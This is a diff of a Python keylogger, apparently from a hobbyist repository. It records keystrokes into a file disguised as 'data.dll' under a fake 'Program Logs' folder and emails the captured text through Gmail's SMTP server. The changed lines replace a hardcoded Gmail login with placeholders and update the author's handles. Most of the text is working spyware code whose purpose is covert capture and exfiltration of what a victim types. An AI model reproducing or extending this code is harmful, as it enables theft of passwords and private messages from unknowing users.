@@ -63,7 +63,8 @@
 # It records key strokes and sends the recorded strokes via email
 
 """          ~by: Ayush Singh
-                        CEO and Founder at AnonymousPirates                  """
+                        @officialPirate (Twitter)
+                        @_neural.network_ (Instagram)     """
 
 
 from os import makedirs, chdir
@@ -75,7 +76,7 @@ from pynput.keyboard import Listener
 
 try:
 
-    if not exists("C:\\Program Logs\\filesystem"):
+    if not exists("C:\\Program Logs\\filesystem"):    # Checks for any previous records
         chdir("C:\\")
         makedirs('Program Logs')
         chdir('Program Logs')
@@ -91,11 +92,15 @@ try:
         f9 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.dll', 'w')
 
     if exists("C:\\Program Logs\\filesystem"):
-        f2 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.dll', 'r')#Reads the previous stored content and sends it via email
+        f2 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.dll', 'r')#Reads the previous stored content to send it via email
         msg = f2.read()
         f2.close()
 
         try:
+          
+          
+            my_email = 'someone@example.com'
+            my_password = 'MyPassword'
             mail = SMTP('smtp.gmail.com', 587)
 
 
@@ -103,9 +108,9 @@ try:
 
             mail.starttls()
 
-            mail.login('server.no07@gmail.com', 'GoogleService')
+            mail.login(my_email, my_password)
 
-            mail.sendmail('server.no07@gmail.com', 'server.no07@gmail.com', msg)
+            mail.sendmail(my_email, my_email, msg)  # Sends an email to itself
         except:
             print('No internet connection')
 
